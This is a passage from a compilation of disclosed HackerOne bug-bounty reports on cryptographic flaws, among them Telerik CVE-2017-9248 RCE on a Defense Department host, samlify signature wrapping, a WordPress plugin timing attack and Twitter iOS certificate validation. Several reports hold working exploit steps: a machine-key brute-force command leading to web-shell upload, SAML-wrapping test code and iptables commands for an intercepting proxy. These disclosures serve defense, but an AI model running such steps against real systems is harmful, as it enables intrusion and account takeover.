- **CVE(s):** -

**Vulnerability Information:**

We found an issue in the JWE specification where it fails to warn the implementers about Invalid Curve attack.
We found several libraries to be vulnerable :   node-jose, jose2go, Nimbus JOSE+JWT and jose4j and in the process of filing an errata for the RFC.
We report the vulnerabilities to the maintainers that promptly fixed the issue.
We also wrote a blog post about it in order to reach the highest number of people potentially vulnerable. You can find the write up in [0,1,2].

[0] http://blog.intothesymmetry.com/2017/03/critical-vulnerability-in-json-web.html
[1] http://blogs.adobe.com/security/2017/03/critical-vulnerability-uncovered-in-json-encryption.html
[2] https://auth0.com/blog/critical-vulnerability-in-json-web-encryption/

---

### [RCE on https://█████/ Using CVE-2017-9248](https://hackerone.com/reports/491668)

- **Report ID:** `491668`
- **Severity:** Critical
- **Weakness:** Cryptographic Issues - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @warsong
- **Bounty:** - usd
- **Disclosed:** 2019-10-10T19:12:25.476Z
- **CVE(s):** CVE-2017-9248

**Vulnerability Information:**

Summary:
https://█████████/ is hosting an unpatched version of the Telerik DialogHandler Telerik.Web.UI.DialogHandler.aspx allowing for the machine key to be brute forced. The machine key can be used to access the DNN file manager to upload arbitrary files including ASPX giving a web shell and RCE.

Description:
Telerik has a known cryptographic weakness in older versions of the Dialog Handler which when exploited can be used to brute force the machine key and gain access to the DNN file manager. The file manager allows for ASPX shell upload and RCE.

Step-by-step Reproduction Instructions
Hit https://███/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx and notice the handler dialog message.
Download https://github.com/bao7uo/dp_crypto to make brute force simple and run: 
python dp_crypto.py -k https://███████/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx 88 all 21

Wait for the script to finish and the key will be integrated into a link to the file manager for DNN.
You can use this link to upload arbitrary files to DNN. I uploaded a PNG for proof but ASPX works just as well here.  I had to do a little trial and error on this one, it uses the ASCII character set and figuring out a key length of 88 took a little doing but going longer than the real key causes the base64 to start validating again from the beginning so in a test of 128 key length I was able to see the key repeat at the 89th position.

https://████████/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp=HBJ/KxQ5LRscHB8ELSgfLDIsMUYUZxs2HAchCS1mEEYfLTllLCoDGwJaCCszEhxzF2YULSsCIUsCLDY+Nj0MQQAoIiMtEyFyGBMbTixmJQIAPgBPAwYIVRcoMi8fA2QeFxMDWhUSAzkIMwdcGAMYcCwtMQAvExNZNhc5dxYTLQ0XOS09HRMYOilnA3IaKB9EFC0yPgY9YFkXOCIFFhMUPRcGIgMCdBwDGyIpCzNje1YbAgxzLBwYBBsMGwAVFiYNHS05RBRKJhQbPV9DAWULWQsMC1ouAhcfKSIIKzI4fzkBdgQ8KxIcQgMpHBMfBypFFFofex8QGAEvOBMTLHcDci8tIRQLFm9RFAMEMSwDYA0BAQtZLQ0fFh0vBEMbeAB0FD4TNBcMLWMxEzlGFhMHMCw9IisEZyZ1F2MuAhYSMUsUORM/Hi4QRQMvPTUCABgKL2cbEix3OQIUIjkIM2MIbBcdGCwBEQ8fLwwfXQMBEAkeWxNAL3ccBi0HXkktZhNMA2Z4RSsDAwIpLBg+M2YQMxd3ADwZDSVGFD9RLzA9DEEfBhwxLHY5NAAWIk0YXTlYKUspEDUWVUcCAxg6KQMABAAHKVAtEhxPBC0PRh1kPg8tWykILwNwYDBnF1ouBy0wFD0iPQsGPTkBdQwtLQ0HXQFaMnM2LQ9LLwYcMR0DAC8vEmwULQEXXCk9DAsDPHtOLXcfMAAXIkAZAxdEFXYHEgtZHEMfXQw2LVgyCQMXPVQELhMAGSgPOR0+LhILAjIvLl06NwMuG0EXPRwxCFoLXhcGNjcuHD43L2dhDxx3OVwvPVIWBxlRShQQfysvAwAEHykXQix3BAkcKDFnHwEQPxkGDzEtEwMAHAIpURl0OUYbBgw1NQMAGxheFC4dPyUEGi0QFDEsNWooIwAjAgFZdRQ4YCkrZxxNKDIbNTBgdw8ZEQQUKRIlLwMQE2QZdQtLBj0tWy93BDcbBCUgGGctBwU6LQMVdQ8/GwQUJgYQOjQUaD10GAM5aR0yMhAEPS1IHj4AIy0DIjIZOxcTA1oEARktGzo0FAwIAA0iDiw4E0QZHD0CFXQUAAcFB1sedhBwGQY2AioCNWwEPgNaLREPDRkvFAQEAhgbHl4YLRl1fHwZBgw0BD0QSyksIisuLi5zGQIlPSxmOWwbLiUoAxRoRBopLggsEWUOGBAQBh4SKQkzWC1+KWcydS8yJQkUAgtZMBMXWisDOQEvAyIACAIyORdjIT8DABNZLCIqKw==

https://████/GSP.png

Product, Version, and Configuration (If applicable)
Telerik <= 2017.1.118

Suggested Mitigation/Remediation Actions
Patch Telerik or switch to a different editor like CKEditor.

## Impact

Critical: Exploitation allows for a web shell, defacement, etc through arbitrary unrestricted file uploads.

---

### [WordPress Automatic Update Protocol Does Not Authenticate Updates Provided by the Server](https://hackerone.com/reports/228854)

- **Report ID:** `228854`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** WordPress
- **Reporter:** @paragonie-scott
- **Bounty:** - usd
- **Disclosed:** 2019-07-22T16:21:59.487Z
- **CVE(s):** -

**Vulnerability Information:**

When the WordPress automatic update process is initiated (likely via `wp-cron.php`), this is the path the code takes:

* https://github.com/WordPress/WordPress/blob/4a6f90db58a935abb688cfb91b391dffeda7b35c/wp-admin/includes/class-wp-upgrader.php#L242-L283
* https://github.com/WordPress/WordPress/blob/38347d7c580be4cdd8476e4bbc653d5c79ed9b67/wp-admin/includes/file.php#L482-L525
* https://github.com/WordPress/WordPress/blob/9f4bbcdb7896a7baba9eb88add281f3fbcdec0ef/wp-includes/http.php#L67-L71
* https://github.com/WordPress/WordPress/blob/76d77e927bb4d0f87c7262a50e28d84e01fd2b11/wp-includes/class-http.php#L597-L613
* https://github.com/WordPress/WordPress/blob/76d77e927bb4d0f87c7262a50e28d84e01fd2b11/wp-includes/class-http.php#L95-L425

The only integrity check that is provided is that the `Content-MD5` header sent by the WordPress server is [checked against the MD5 checksum of the file](https://github.com/WordPress/WordPress/blob/38347d7c580be4cdd8476e4bbc653d5c79ed9b67/wp-admin/includes/file.php#L515-L522) (which, if omitted by the server, the WordPress site will silently disregard).

There is no code signing in place. As a consequence, an attacker who has fully compromised the WordPress update server can issue updates to any WordPress install on the Internet that hasn't disabled automatic updates.

I have previously reported this [to the WordPress Trac](https://core.trac.wordpress.org/ticket/39309), along with a proposed solution (Ed25519 signature verification + update hash commitment to a Merkle tree, similar to Mozilla's [Binary Transparency](https://wiki.mozilla.org/Security/Binary_Transparency) project). However, the Powers That Be deemed it a low priority issue, and the rest of the WP core team responded one of two ways:

1. "I don't understand cryptography, so I won't be much help here."
2. "I'm already overworked and can't find the time or energy to touch this."

I hope that, by reporting this to HackerOne, it can be given the attention it requires from people with the time/energy availability and the crypto/security expertise to make a solution happen.

This problem was [narrowly missed before](https://www.wordfence.com/blog/2016/11/hacking-27-web-via-wordpress-auto-update/). I'd like to see it gets fixed before the rest of the Internet has to contend with a DDoS botnet that consists of >20% of the top 10 million websites. I don't imagine many networks would survive such an attack.

---

### [Samlify is vulnerable to signature wrapping](https://hackerone.com/reports/356284)

- **Report ID:** `356284`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @webtonull
- **Bounty:** - usd
- **Disclosed:** 2018-10-23T07:54:50.161Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a signature wrapping weakness in samlify
It allows an attacker to modify a SAML token received from the IdP before validating it with the service provider

# Module

**module name:** samlify
**version:** 2.3.7
**npm page:** `https://www.npmjs.com/package/samlify`

## Module Description

Highly configuarable Node.js SAML 2.0 library for Single Sign On

## Module Stats

> Replace stats below with numbers from npm’s module page:

1084 downloads in the last week

# Vulnerability

## Vulnerability Description

It's possible to wrap the signature of a SAML response, and insert a new username in the original token, thus make it appear as though a different user was authenticated.

## Steps To Reproduce:

Clone the github repo, put this in `test/flow.ts` and run `npm run test`:
```

test('should reject signature wrapped response', async t => {
  // sender (caution: only use metadata and public key when declare pair-up in oppoent entity)
  const user = { email: 'user@esaml2.com' };
  const { id, context: SAMLResponse } = await idpNoEncrypt.createLoginResponse(sp, sampleRequestInfo, 'post', user, createTemplateCallback(idpNoEncrypt, sp, user));
  // receiver (caution: only use metadata and public key when declare pair-up in oppoent entity)

  //Decode
  var buffer = new Buffer(SAMLResponse, "base64");
  var xml = buffer.toString();
  //Create version of response without signature
  var stripped = xml
    .replace(/<ds:Signature[\s\S]*ds:Signature>/, "");
  //Create version of response with altered IDs and new username
  var outer = xml
    .replace(/assertion" ID="_[0-9a-f]{3}/g, 'assertion" ID="_000')
    .replace("user@esaml2.com", "admin@esaml2.com");
  //Put stripped version under SubjectConfirmationData of modified version
  var xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\/>/, "<saml:SubjectConfirmationData>" + stripped.replace('<?xml version="1.0" encoding="UTF-8"?>', "") + "</saml:SubjectConfirmationData>");
  const wrappedResponse = new Buffer(xmlWrapped).toString("base64");

  const { samlContent, extract } = await sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } });
  //should probalby be like this -> const error = await t.throws(sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } }));
  //This tampering goes undetected....and only fails because there are now two names
  t.is(extract.nameid, 'user@esaml2.com');
});
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 16.04
- v7.4.0
- 6.0.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N 

I will try to contact the maintainer. I did not want to open an issue as that would make it obvious what the problem was.

## Impact

Authentication bypass

---

### [Timing Attack in Google Authenticator - Per User Prompt](https://hackerone.com/reports/277534)

- **Report ID:** `277534`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Ian Dunn
- **Reporter:** @whitehatter
- **Bounty:** 25 usd
- **Disclosed:** 2017-10-29T00:35:04.682Z
- **CVE(s):** -

**Vulnerability Information:**

*Google Authenticator - Per User Prompt* contains a timing attack vulnerability in how it validates the application password for a user account.

```
if ( sha1( $attempted_password_plaintext ) === $valid_password_hash || wp_check_password( $attempted_password_plaintext, $valid_password_hash ) ) {
	$this->is_using_application_password = true;
	return $user;
}
```
__wp-content/plugins/google-authenticator-per-user-prompt/google-authenticator-per-user-prompt.php__

As the above code runs on the `authenticate` hook, and uses a strict equality check, it's possible to brute force an application password using a timing attack and gain access to the account, without needing the real password or even a valid OTP token.

The plugin adds two `authenticate` hooks, one for the above app password check, then a second that does the OTP validation stuff, but *only* if the not using an app password. This means that we only need the app password to login, which we can brute force via timing attack.

```
if ( 'enabled' == trim( get_user_option( 'googleauthenticator_enabled', $user->ID ) ) && ! $this->is_using_application_password ) {
    // ... OTP stuff
}
```

The correct way to check the app password is to use `hash_equals()`, which is safe from timing attacks - https://secure.php.net/manual/en/function.hash-equals.php

Example:

```
if ( hash_equals( sha1( $attempted_password_plaintext ), $valid_password_hash ) || ... {
```

It's worth noting that `hash_equals()` is already in use in `Google_Authenticator_Per_User_Prompt::verify_login_nonce()`.

All accounts that have an app password enabled (which is not by default) are vulnerable to takeover using this method.

---

### [NexTable: Credentials exposure](https://hackerone.com/reports/120941)

- **Report ID:** `120941`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Eternal
- **Reporter:** @mrtuxracer
- **Bounty:** - usd
- **Disclosed:** 2017-06-30T04:52:41.136Z
- **CVE(s):** -

**Summary (team):**

There was an issue with how the NexTable was storing passwords for merchants. This was fixed by the NexTable Team.

Thanks @mrtuxracer for reporting this.

---

### [ SSL/TLS Vulnerability at khanacademy.org](https://hackerone.com/reports/207457)

- **Report ID:** `207457`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Khan Academy
- **Reporter:** @hack40077
- **Bounty:** - usd
- **Disclosed:** 2017-02-22T15:40:43.716Z
- **CVE(s):** CVE-2016-2183

**Vulnerability Information:**

CVE - 2011 - 3389
Description : 
The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a "BEAST" attack.

Problem Location : 
https://www.khanacademy.org/

Mitigation : 
The Upgrade TLS version on the server to latest stable version

CVE - 2013 - 0169 :

Description : 
The TLS protocol 1.1 and 1.2 and the DTLS protocol 1.0 and 1.2, as used in OpenSSL, OpenJDK, PolarSSL, and other products, do not properly consider timing side-channel attacks on a MAC check requirement during the processing of malformed CBC padding, which allows remote attackers to conduct distinguishing attacks and plaintext-recovery attacks via statistical analysis of timing data for crafted packets, aka the "Lucky Thirteen" issue.

Problem Location : 
https://www.khanacademy.org/

Mitigation : 
The Upgrade TLS version on the server to latest stable version .


Sweet 32 Attack - CVE-2016-2183, 

Description : 
A flaw was found in the way the DES/3DES cipher was used as part of the TLS/SSL protocol. A man-in-the-middle attacker could use this flaw to recover some plaintext data by capturing large amounts of encrypted traffic between TLS/SSL server and client if the communication used a DES/3DES based ciphersuite.

Problem Location : 
https://www.khanacademy.org/

Mitigation :  
The  removed DES/3DES from the supported lists of crypto algorithms.
TLS libraries and applications should limit the length of TLS sessions with a 64-bit cipher.

References : 
https://sweet32.info/

---

### [Twitter iOS fails to validate server certificate and sends oauth token](https://hackerone.com/reports/168538)

- **Report ID:** `168538`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** X / xAI
- **Reporter:** @floyd
- **Bounty:** 2100 usd
- **Disclosed:** 2016-12-23T14:34:45.368Z
- **CVE(s):** CVE-2016-10511

**Vulnerability Information:**

Twitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - *no* we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of https://api.twitter.com . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce:
1. Start Burp or other Proxy software in transparent mode. Setting "Generate CA-signed per-host certificates", which means the CA cert of Burp is used, which is *not* trusted on the iPhones.
2. Start rogue Wifi access point (eg. on the same machine as burp)
3. Redirect all incoming HTTPS traffic on the rogue Wifi access point to the transparent proxy. We simply used on Linux:
iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080
iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
4. Connect with the iOS device to the Wifi access point
5. Open Twitter app on iOS
6. In burp only the calls to api.twitter.com are visible and include sensitive authentication information etc.

This is the information we saw for two different accounts in burp which includes the oauth token etc.:

GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
Host: api.twitter.com
█████████
X-Twitter-Client-Version: 6.62
X-Twitter-Polling: true
X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
X-Twitter-Client-Language: de
X-B3-TraceId: cc8ac1aea2ba5628
x-spdy-bypass: 1
Accept: */*
Accept-Language: de
Accept-Encoding: gzip, deflate
X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
Connection: close
X-Twitter-API-Version: 5
X-Twitter-Client-Limit-Ad-Tracking: 1
X-Twitter-Client: Twitter-iPhone



HTTP/1.1 304 Not Modified
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-length: 0
content-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;
content-type: text/html;charset=utf-8
date: Thu, 15 Sep 2016 08:33:18 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Thu, 15 Sep 2016 08:33:18 GMT
pragma: no-cache
server: tsa_b
set-cookie: guest_id=v1%3A147392839826657964; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:33:18 UTC
status: 304 Not Modified
strict-transport-security: max-age=631138519
x-access-level: read-write
x-client-event-enabled: true
x-connection-hash: 40e91f874332181942e1454b13ccaa6a
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-rate-limit-limit: 15
x-rate-limit-remaining: 12
x-rate-limit-reset: 1473929244
x-response-time: 29
x-transaction: cc8ac1aea2ba5628
x-twitter-response-tags: BouncerExempt
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 1; mode=block



GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
Host: api.twitter.com
█████████
X-Twitter-Client-Version: 6.62
X-Twitter-Polling: true
X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
X-Twitter-Client-Language: de
X-B3-TraceId: 796651628eef7eed
x-spdy-bypass: 1
Accept: */*
Accept-Language: de
Accept-Encoding: gzip, deflate
X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
Connection: close
X-Twitter-API-Version: 5
X-Twitter-Client-Limit-Ad-Tracking: 1
X-Twitter-Client: Twitter-iPhone



HTTP/1.1 304 Not Modified
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-length: 0
content-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;
content-type: text/html;charset=utf-8
date: Thu, 15 Sep 2016 08:34:36 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Thu, 15 Sep 2016 08:34:36 GMT
pragma: no-cache
server: tsa_b
set-cookie: guest_id=v1%3A147392847623972314; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:34:36 UTC
status: 304 Not Modified
strict-transport-security: max-age=631138519
x-access-level: read-write
x-client-event-enabled: true
x-connection-hash: e980abd0bd35e3bf0b8c693e8a12f636
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-rate-limit-limit: 15
x-rate-limit-remaining: 11
x-rate-limit-reset: 1473929244
x-response-time: 44
x-transaction: 796651628eef7eed
x-twitter-response-tags: BouncerExempt
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 1; mode=block

---
